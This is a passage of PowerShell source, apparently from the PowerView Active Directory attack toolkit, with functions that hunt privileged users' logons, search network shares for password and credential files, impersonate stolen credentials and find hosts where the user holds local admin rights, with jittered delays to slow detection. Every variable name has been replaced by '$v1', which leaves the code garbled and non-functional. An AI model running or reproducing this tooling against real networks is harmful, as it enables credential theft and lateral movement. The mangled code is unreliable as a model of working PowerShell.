                                $v1
                            }
                        }

                        elseif ($v1 -Contains $v1.User) {
                            $v1
                        }
                    }
                }
            }
        }
    }

    PROCESS {

        if ($v1['Delay'] -or $v1['StopOnSuccess']) {

            Write-Verbose "[Find-DomainProcess] Total number of hosts: $($v1.count)"
            Write-Verbose "[Find-DomainProcess] Delay: $v1, Jitter: $v1"
            $v1 = 0
            $v1 = New-Object System.Random

            ForEach ($v1 in $v1) {
                $v1 = $v1 + 1


                Start-Sleep -Seconds $v1.Next((1-$v1)*$v1, (1+$v1)*$v1)

                Write-Verbose "[Find-DomainProcess] Enumerating server $v1 ($v1 of $($v1.count))"
                $v1 = Invoke-Command -ScriptBlock $v1 -ArgumentList $v1, $v1, $v1, $v1
                $v1

                if ($v1 -and $v1) {
                    Write-Verbose "[Find-DomainProcess] Target user found, returning early"
                    return
                }
            }
        }
        else {
            Write-Verbose "[Find-DomainProcess] Using threading with threads: $v1"


            $v1 = @{
                'ProcessName' = $v1
                'TargetUsers' = $v1
                'Credential' = $v1
            }


            New-ThreadedFunction -ComputerName $v1 -ScriptBlock $v1 -ScriptParameters $v1 -Threads $v1
        }
    }
}


function Find-DomainUserEvent {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerView.LogonEvent')]
    [OutputType('PowerView.ExplicitCredentialLogon')]
    [CmdletBinding(DefaultParameterSetName = 'Domain')]
    Param(
        [Parameter(ParameterSetName = 'ComputerName', Position = 0, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $v1,

        [Parameter(ParameterSetName = 'Domain')]
        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $v1,

        [Parameter(ValueFromPipelineByPropertyName = $v1)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $v1 = [DateTime]::Now.AddDays(-1),

        [Parameter(ValueFromPipelineByPropertyName = $v1)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $v1 = [DateTime]::Now,

        [ValidateRange(1, 1000000)]
        [Int]
        $v1 = 5000,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $v1 = 'Domain Admins',

        [Alias('AdminCount')]
        [Switch]
        $v1,

        [Switch]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $v1,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $v1 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $v1 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $v1,

        [Switch]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $v1,

        [ValidateRange(1, 10000)]
        [Int]
        $v1 = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $v1 = .3,

        [Int]
        [ValidateRange(1, 100)]
        $v1 = 20
    )

    BEGIN {
        $v1 = @{
            'Properties' = 'samaccountname'
        }
        if ($v1['UserIdentity']) { $v1['Identity'] = $v1 }
        if ($v1['UserDomain']) { $v1['Domain'] = $v1 }
        if ($v1['UserLDAPFilter']) { $v1['LDAPFilter'] = $v1 }
        if ($v1['UserSearchBase']) { $v1['SearchBase'] = $v1 }
        if ($v1['UserAdminCount']) { $v1['AdminCount'] = $v1 }
        if ($v1['Server']) { $v1['Server'] = $v1 }
        if ($v1['SearchScope']) { $v1['SearchScope'] = $v1 }
        if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
        if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
        if ($v1['Tombstone']) { $v1['Tombstone'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }

        if ($v1['UserIdentity'] -or $v1['UserLDAPFilter'] -or $v1['UserSearchBase'] -or $v1['UserAdminCount']) {
            $v1 = Get-DomainUser @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        elseif ($v1['UserGroupIdentity'] -or (-not $v1['Filter'])) {

            $v1 = @{
                'Identity' = $v1
                'Recurse' = $v1
            }
            Write-Verbose "UserGroupIdentity: $v1"
            if ($v1['UserDomain']) { $v1['Domain'] = $v1 }
            if ($v1['UserSearchBase']) { $v1['SearchBase'] = $v1 }
            if ($v1['Server']) { $v1['Server'] = $v1 }
            if ($v1['SearchScope']) { $v1['SearchScope'] = $v1 }
            if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
            if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
            if ($v1['Tombstone']) { $v1['Tombstone'] = $v1 }
            if ($v1['Credential']) { $v1['Credential'] = $v1 }
            $v1 = Get-DomainGroupMember @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }


        if ($v1['ComputerName']) {
            $v1 = $v1
        }
        else {

            $v1 = @{
                'LDAP' = $v1
            }
            if ($v1['Domain']) { $v1['Domain'] = $v1 }
            if ($v1['Server']) { $v1['Server'] = $v1 }
            if ($v1['Credential']) { $v1['Credential'] = $v1 }
            Write-Verbose "[Find-DomainUserEvent] Querying for domain controllers in domain: $v1"
            $v1 = Get-DomainController @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        if ($v1 -and ($v1 -isnot [System.Array])) {
            $v1 = @(,$v1)
        }
        Write-Verbose "[Find-DomainUserEvent] TargetComputers length: $($v1.Length)"
        Write-Verbose "[Find-DomainUserEvent] TargetComputers $v1"
        if ($v1.Length -eq 0) {
            throw '[Find-DomainUserEvent] No hosts found to enumerate'
        }


        $v1 = {
            Param($v1, $v1, $v1, $v1, $v1, $v1, $v1)

            ForEach ($v1 in $v1) {
                $v1 = Test-Connection -Count 1 -Quiet -ComputerName $v1
                if ($v1) {
                    $v1 = @{
                        'ComputerName' = $v1
                    }
                    if ($v1) { $v1['StartTime'] = $v1 }
                    if ($v1) { $v1['EndTime'] = $v1 }
                    if ($v1) { $v1['MaxEvents'] = $v1 }
                    if ($v1) { $v1['Credential'] = $v1 }
                    if ($v1 -or $v1) {
                        if ($v1) {
                            Get-DomainUserEvent @DomainUserEventArgs | Where-Object {$v1 -contains $v1.TargetUserName}
                        }
                        else {
                            $v1 = 'or'
                            $v1.Keys | ForEach-Object {
                                if (($v1 -eq 'Op') -or ($v1 -eq 'Operator') -or ($v1 -eq 'Operation')) {
                                    if (($v1[$v1] -match '&') -or ($v1[$v1] -eq 'and')) {
                                        $v1 = 'and'
                                    }
                                }
                            }
                            $v1 = $v1.Keys | Where-Object {($v1 -ne 'Op') -and ($v1 -ne 'Operator') -and ($v1 -ne 'Operation')}
                            Get-DomainUserEvent @DomainUserEventArgs | ForEach-Object {
                                if ($v1 -eq 'or') {
                                    ForEach ($v1 in $v1) {
                                        if ($v1."$v1" -match $v1[$v1]) {
                                            $v1
                                        }
                                    }
                                }
                                else {

                                    ForEach ($v1 in $v1) {
                                        if ($v1."$v1" -notmatch $v1[$v1]) {
                                            break
                                        }
                                        $v1
                                    }
                                }
                            }
                        }
                    }
                    else {
                        Get-DomainUserEvent @DomainUserEventArgs
                    }
                }
            }
        }
    }

    PROCESS {

        if ($v1['Delay'] -or $v1['StopOnSuccess']) {

            Write-Verbose "[Find-DomainUserEvent] Total number of hosts: $($v1.count)"
            Write-Verbose "[Find-DomainUserEvent] Delay: $v1, Jitter: $v1"
            $v1 = 0
            $v1 = New-Object System.Random

            ForEach ($v1 in $v1) {
                $v1 = $v1 + 1


                Start-Sleep -Seconds $v1.Next((1-$v1)*$v1, (1+$v1)*$v1)

                Write-Verbose "[Find-DomainUserEvent] Enumerating server $v1 ($v1 of $($v1.count))"
                $v1 = Invoke-Command -ScriptBlock $v1 -ArgumentList $v1, $v1, $v1, $v1, $v1, $v1, $v1
                $v1

                if ($v1 -and $v1) {
                    Write-Verbose "[Find-DomainUserEvent] Target user found, returning early"
                    return
                }
            }
        }
        else {
            Write-Verbose "[Find-DomainUserEvent] Using threading with threads: $v1"


            $v1 = @{
                'StartTime' = $v1
                'EndTime' = $v1
                'MaxEvents' = $v1
                'TargetUsers' = $v1
                'Filter' = $v1
                'Credential' = $v1
            }


            New-ThreadedFunction -ComputerName $v1 -ScriptBlock $v1 -ScriptParameters $v1 -Threads $v1
        }
    }
}


function Find-DomainShare {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ShareInfo')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('DNSHostName')]
        [String[]]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('Domain')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $v1,

        [Alias('CheckAccess')]
        [Switch]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $v1,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $v1 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $v1 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $v1,

        [Switch]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $v1 = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $v1 = .3,

        [Int]
        [ValidateRange(1, 100)]
        $v1 = 20
    )

    BEGIN {

        $v1 = @{
            'Properties' = 'dnshostname'
        }
        if ($v1['ComputerDomain']) { $v1['Domain'] = $v1 }
        if ($v1['ComputerLDAPFilter']) { $v1['LDAPFilter'] = $v1 }
        if ($v1['ComputerSearchBase']) { $v1['SearchBase'] = $v1 }
        if ($v1['Unconstrained']) { $v1['Unconstrained'] = $v1 }
        if ($v1['ComputerOperatingSystem']) { $v1['OperatingSystem'] = $v1 }
        if ($v1['ComputerServicePack']) { $v1['ServicePack'] = $v1 }
        if ($v1['ComputerSiteName']) { $v1['SiteName'] = $v1 }
        if ($v1['Server']) { $v1['Server'] = $v1 }
        if ($v1['SearchScope']) { $v1['SearchScope'] = $v1 }
        if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
        if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
        if ($v1['Tombstone']) { $v1['Tombstone'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }

        if ($v1['ComputerName']) {
            $v1 = $v1
        }
        else {
            Write-Verbose '[Find-DomainShare] Querying computers in the domain'
            $v1 = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-DomainShare] TargetComputers length: $($v1.Length)"
        if ($v1.Length -eq 0) {
            throw '[Find-DomainShare] No hosts found to enumerate'
        }


        $v1 = {
            Param($v1, $v1, $v1)

            if ($v1) {

                $v1 = Invoke-UserImpersonation -TokenHandle $v1 -Quiet
            }

            ForEach ($v1 in $v1) {
                $v1 = Test-Connection -Count 1 -Quiet -ComputerName $v1
                if ($v1) {

                    $v1 = Get-NetShare -ComputerName $v1
                    ForEach ($v1 in $v1) {
                        $v1 = $v1.Name

                        $v1 = '\\'+$v1+'\'+$v1

                        if (($v1) -and ($v1.trim() -ne '')) {

                            if ($v1) {

                                try {
                                    $v1 = [IO.Directory]::GetFiles($v1)
                                    $v1
                                }
                                catch {
                                    Write-Verbose "Error accessing share path $v1 : $v1"
                                }
                            }
                            else {
                                $v1
                            }
                        }
                    }
                }
            }

            if ($v1) {
                Invoke-RevertToSelf
            }
        }

        $v1 = $v1
        if ($v1['Credential']) {
            if ($v1['Delay'] -or $v1['StopOnSuccess']) {
                $v1 = Invoke-UserImpersonation -Credential $v1
            }
            else {
                $v1 = Invoke-UserImpersonation -Credential $v1 -Quiet
            }
        }
    }

    PROCESS {

        if ($v1['Delay'] -or $v1['StopOnSuccess']) {

            Write-Verbose "[Find-DomainShare] Total number of hosts: $($v1.count)"
            Write-Verbose "[Find-DomainShare] Delay: $v1, Jitter: $v1"
            $v1 = 0
            $v1 = New-Object System.Random

            ForEach ($v1 in $v1) {
                $v1 = $v1 + 1


                Start-Sleep -Seconds $v1.Next((1-$v1)*$v1, (1+$v1)*$v1)

                Write-Verbose "[Find-DomainShare] Enumerating server $v1 ($v1 of $($v1.count))"
                Invoke-Command -ScriptBlock $v1 -ArgumentList $v1, $v1, $v1
            }
        }
        else {
            Write-Verbose "[Find-DomainShare] Using threading with threads: $v1"


            $v1 = @{
                'CheckShareAccess' = $v1
                'TokenHandle' = $v1
            }


            New-ThreadedFunction -ComputerName $v1 -ScriptBlock $v1 -ScriptParameters $v1 -Threads $v1
        }
    }

    END {
        if ($v1) {
            Invoke-RevertToSelf -TokenHandle $v1
        }
    }
}


function Find-InterestingDomainShareFile {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('DNSHostName')]
        [String[]]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $v1,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        $v1 = @('*password*', '*sensitive*', '*admin*', '*login*', '*secret*', 'unattend*.xml', '*.vmdk', '*creds*', '*credential*', '*.config'),

        [ValidateNotNullOrEmpty()]
        [ValidatePattern('\\\\')]
        [Alias('Share')]
        [String[]]
        $v1,

        [String[]]
        $v1 = @('C$', 'Admin$', 'Print$', 'IPC$'),

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $v1,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $v1,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $v1,

        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        $v1,

        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $v1,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $v1 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $v1 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $v1,

        [Switch]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $v1 = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $v1 = .3,

        [Int]
        [ValidateRange(1, 100)]
        $v1 = 20
    )

    BEGIN {
        $v1 = @{
            'Properties' = 'dnshostname'
        }
        if ($v1['ComputerDomain']) { $v1['Domain'] = $v1 }
        if ($v1['ComputerLDAPFilter']) { $v1['LDAPFilter'] = $v1 }
        if ($v1['ComputerSearchBase']) { $v1['SearchBase'] = $v1 }
        if ($v1['ComputerOperatingSystem']) { $v1['OperatingSystem'] = $v1 }
        if ($v1['ComputerServicePack']) { $v1['ServicePack'] = $v1 }
        if ($v1['ComputerSiteName']) { $v1['SiteName'] = $v1 }
        if ($v1['Server']) { $v1['Server'] = $v1 }
        if ($v1['SearchScope']) { $v1['SearchScope'] = $v1 }
        if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
        if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
        if ($v1['Tombstone']) { $v1['Tombstone'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }

        if ($v1['ComputerName']) {
            $v1 = $v1
        }
        else {
            Write-Verbose '[Find-InterestingDomainShareFile] Querying computers in the domain'
            $v1 = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-InterestingDomainShareFile] TargetComputers length: $($v1.Length)"
        if ($v1.Length -eq 0) {
            throw '[Find-InterestingDomainShareFile] No hosts found to enumerate'
        }


        $v1 = {
            Param($v1, $v1, $v1, $v1, $v1, $v1, $v1, $v1)

            if ($v1) {

                $v1 = Invoke-UserImpersonation -TokenHandle $v1 -Quiet
            }

            ForEach ($v1 in $v1) {

                $v1 = @()
                if ($v1.StartsWith('\\')) {

                    $v1 += $v1
                }
                else {
                    $v1 = Test-Connection -Count 1 -Quiet -ComputerName $v1
                    if ($v1) {

                        $v1 = Get-NetShare -ComputerName $v1
                        ForEach ($v1 in $v1) {
                            $v1 = $v1.Name
                            $v1 = '\\'+$v1+'\'+$v1

                            if (($v1) -and ($v1.Trim() -ne '')) {

                                if ($v1 -NotContains $v1) {

                                    try {
                                        $v1 = [IO.Directory]::GetFiles($v1)
                                        $v1 += $v1
                                    }
                                    catch {
                                        Write-Verbose "[!] No access to $v1"
                                    }
                                }
                            }
                        }
                    }
                }

                ForEach ($v1 in $v1) {
                    Write-Verbose "Searching share: $v1"
                    $v1 = @{
                        'Path' = $v1
                        'Include' = $v1
                    }
                    if ($v1) {
                        $v1['OfficeDocs'] = $v1
                    }
                    if ($v1) {
                        $v1['FreshEXEs'] = $v1
                    }
                    if ($v1) {
                        $v1['LastAccessTime'] = $v1
                    }
                    if ($v1) {
                        $v1['LastWriteTime'] = $v1
                    }
                    if ($v1) {
                        $v1['CreationTime'] = $v1
                    }
                    if ($v1) {
                        $v1['CheckWriteAccess'] = $v1
                    }
                    Find-InterestingFile @SearchArgs
                }
            }

            if ($v1) {
                Invoke-RevertToSelf
            }
        }

        $v1 = $v1
        if ($v1['Credential']) {
            if ($v1['Delay'] -or $v1['StopOnSuccess']) {
                $v1 = Invoke-UserImpersonation -Credential $v1
            }
            else {
                $v1 = Invoke-UserImpersonation -Credential $v1 -Quiet
            }
        }
    }

    PROCESS {

        if ($v1['Delay'] -or $v1['StopOnSuccess']) {

            Write-Verbose "[Find-InterestingDomainShareFile] Total number of hosts: $($v1.count)"
            Write-Verbose "[Find-InterestingDomainShareFile] Delay: $v1, Jitter: $v1"
            $v1 = 0
            $v1 = New-Object System.Random

            ForEach ($v1 in $v1) {
                $v1 = $v1 + 1


                Start-Sleep -Seconds $v1.Next((1-$v1)*$v1, (1+$v1)*$v1)

                Write-Verbose "[Find-InterestingDomainShareFile] Enumerating server $v1 ($v1 of $($v1.count))"
                Invoke-Command -ScriptBlock $v1 -ArgumentList $v1, $v1, $v1, $v1, $v1, $v1, $v1, $v1
            }
        }
        else {
            Write-Verbose "[Find-InterestingDomainShareFile] Using threading with threads: $v1"


            $v1 = @{
                'Include' = $v1
                'ExcludedShares' = $v1
                'OfficeDocs' = $v1
                'ExcludeHidden' = $v1
                'FreshEXEs' = $v1
                'CheckWriteAccess' = $v1
                'TokenHandle' = $v1
            }


            New-ThreadedFunction -ComputerName $v1 -ScriptBlock $v1 -ScriptParameters $v1 -Threads $v1
        }
    }

    END {
        if ($v1) {
            Invoke-RevertToSelf -TokenHandle $v1
        }
    }
}


function Find-LocalAdminAccess {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('DNSHostName')]
        [String[]]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $v1,

        [Switch]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $v1,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $v1 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $v1 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $v1,

        [Switch]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $v1 = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $v1 = .3,

        [Int]
        [ValidateRange(1, 100)]
        $v1 = 20
    )

    BEGIN {
        $v1 = @{
            'Properties' = 'dnshostname'
        }
        if ($v1['ComputerDomain']) { $v1['Domain'] = $v1 }
        if ($v1['ComputerLDAPFilter']) { $v1['LDAPFilter'] = $v1 }
        if ($v1['ComputerSearchBase']) { $v1['SearchBase'] = $v1 }
        if ($v1['Unconstrained']) { $v1['Unconstrained'] = $v1 }
        if ($v1['ComputerOperatingSystem']) { $v1['OperatingSystem'] = $v1 }
        if ($v1['ComputerServicePack']) { $v1['ServicePack'] = $v1 }
        if ($v1['ComputerSiteName']) { $v1['SiteName'] = $v1 }
        if ($v1['Server']) { $v1['Server'] = $v1 }
        if ($v1['SearchScope']) { $v1['SearchScope'] = $v1 }
        if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
        if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
        if ($v1['Tombstone']) { $v1['Tombstone'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }

        if ($v1['ComputerName']) {
            $v1 = $v1
        }
        else {
            Write-Verbose '[Find-LocalAdminAccess] Querying computers in the domain'
            $v1 = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-LocalAdminAccess] TargetComputers length: $($v1.Length)"
        if ($v1.Length -eq 0) {
            throw '[Find-LocalAdminAccess] No hosts found to enumerate'
        }


        $v1 = {
            Param($v1, $v1)

            if ($v1) {

                $v1 = Invoke-UserImpersonation -TokenHandle $v1 -Quiet
            }

            ForEach ($v1 in $v1) {
                $v1 = Test-Connection -Count 1 -Quiet -ComputerName $v1
                if ($v1) {

                    $v1 = Test-AdminAccess -ComputerName $v1
                    if ($v1.IsAdmin) {
                        $v1
                    }
                }
            }

            if ($v1) {
                Invoke-RevertToSelf
            }
        }

        $v1 = $v1
        if ($v1['Credential']) {
            if ($v1['Delay'] -or $v1['StopOnSuccess']) {
                $v1 = Invoke-UserImpersonation -Credential $v1
            }
            else {
                $v1 = Invoke-UserImpersonation -Credential $v1 -Quiet
            }
        }
    }

    PROCESS {

        if ($v1['Delay'] -or $v1['StopOnSuccess']) {

            Write-Verbose "[Find-LocalAdminAccess] Total number of hosts: $($v1.count)"
            Write-Verbose "[Find-LocalAdminAccess] Delay: $v1, Jitter: $v1"
            $v1 = 0
            $v1 = New-Object System.Random

            ForEach ($v1 in $v1) {
                $v1 = $v1 + 1


                Start-Sleep -Seconds $v1.Next((1-$v1)*$v1, (1+$v1)*$v1)

                Write-Verbose "[Find-LocalAdminAccess] Enumerating server $v1 ($v1 of $($v1.count))"
                Invoke-Command -ScriptBlock $v1 -ArgumentList $v1, $v1
            }
        }
        else {
            Write-Verbose "[Find-LocalAdminAccess] Using threading with threads: $v1"


            $v1 = @{
                'TokenHandle' = $v1
            }


            New-ThreadedFunction -ComputerName $v1 -ScriptBlock $v1 -ScriptParameters $v1 -Threads $v1
        }
    }
}


function Find-DomainLocalGroupMember {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroupMember.API')]
    [OutputType('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('DNSHostName')]
        [String[]]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $v1,

        [Parameter(ValueFromPipelineByPropertyName = $v1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $v1 = 'Administrators',

        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $v1 = 'API',

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $v1,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $v1 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $v1 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $v1,

        [Switch]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $v1 = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $v1 = .3,

        [Int]
        [ValidateRange(1, 100)]
        $v1 = 20
    )

    BEGIN {
        $v1 = @{
            'Properties' = 'dnshostname'
        }
        if ($v1['ComputerDomain']) { $v1['Domain'] = $v1 }
        if ($v1['ComputerLDAPFilter']) { $v1['LDAPFilter'] = $v1 }
        if ($v1['ComputerSearchBase']) { $v1['SearchBase'] = $v1 }
        if ($v1['Unconstrained']) { $v1['Unconstrained'] = $v1 }
        if ($v1['ComputerOperatingSystem']) { $v1['OperatingSystem'] = $v1 }
        if ($v1['ComputerServicePack']) { $v1['ServicePack'] = $v1 }
        if ($v1['ComputerSiteName']) { $v1['SiteName'] = $v1 }
        if ($v1['Server']) { $v1['Server'] = $v1 }
        if ($v1['SearchScope']) { $v1['SearchScope'] = $v1 }
        if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
        if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
        if ($v1['Tombstone']) { $v1['Tombstone'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }

        if ($v1['ComputerName']) {
            $v1 = $v1
        }
        else {
            Write-Verbose '[Find-DomainLocalGroupMember] Querying computers in the domain'
            $v1 = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-DomainLocalGroupMember] TargetComputers length: $($v1.Length)"
        if ($v1.Length -eq 0) {
            throw '[Find-DomainLocalGroupMember] No hosts found to enumerate'
        }


        $v1 = {
            Param($v1, $v1, $v1, $v1)


            if ($v1 -eq "Administrators") {
                $v1 = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid,$v1)
                $v1 = ($v1.Translate([System.Security.Principal.NTAccount]).Value -split "\\")[-1]
            }

            if ($v1) {

                $v1 = Invoke-UserImpersonation -TokenHandle $v1 -Quiet
            }

            ForEach ($v1 in $v1) {
                $v1 = Test-Connection -Count 1 -Quiet -ComputerName $v1
                if ($v1) {
                    $v1 = @{
                        'ComputerName' = $v1
                        'Method' = $v1
                        'GroupName' = $v1
                    }
                    Get-NetLocalGroupMember @NetLocalGroupMemberArguments
                }
            }

            if ($v1) {
                Invoke-RevertToSelf
            }
        }

        $v1 = $v1
        if ($v1['Credential']) {
            if ($v1['Delay'] -or $v1['StopOnSuccess']) {
                $v1 = Invoke-UserImpersonation -Credential $v1
            }
            else {
                $v1 = Invoke-UserImpersonation -Credential $v1 -Quiet
            }
        }
    }

    PROCESS {

        if ($v1['Delay'] -or $v1['StopOnSuccess']) {

            Write-Verbose "[Find-DomainLocalGroupMember] Total number of hosts: $($v1.count)"
            Write-Verbose "[Find-DomainLocalGroupMember] Delay: $v1, Jitter: $v1"
            $v1 = 0
            $v1 = New-Object System.Random

            ForEach ($v1 in $v1) {
                $v1 = $v1 + 1


                Start-Sleep -Seconds $v1.Next((1-$v1)*$v1, (1+$v1)*$v1)

                Write-Verbose "[Find-DomainLocalGroupMember] Enumerating server $v1 ($v1 of $($v1.count))"
                Invoke-Command -ScriptBlock $v1 -ArgumentList $v1, $v1, $v1, $v1
            }
        }
        else {
